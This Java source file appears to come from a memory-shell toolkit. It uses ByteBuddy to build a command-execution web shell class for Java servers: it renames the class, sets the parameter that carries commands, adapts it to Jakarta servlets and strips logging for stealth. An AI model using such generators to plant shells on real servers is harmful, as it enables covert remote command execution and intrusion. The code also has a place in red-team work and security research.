package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandGenerator {

    public static byte[] generate(ShellConfig config, CommandConfig shellConfig) {
        if (shellConfig.getShellClass() == null) {
            throw new IllegalArgumentException("shellConfig.getClazz() == null");
        }

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(shellConfig.getShellClass())
                .name(shellConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(config.getTargetJreVersion()))
                .field(named("paramName")).value(shellConfig.getParamName());

        if (config.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (config.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}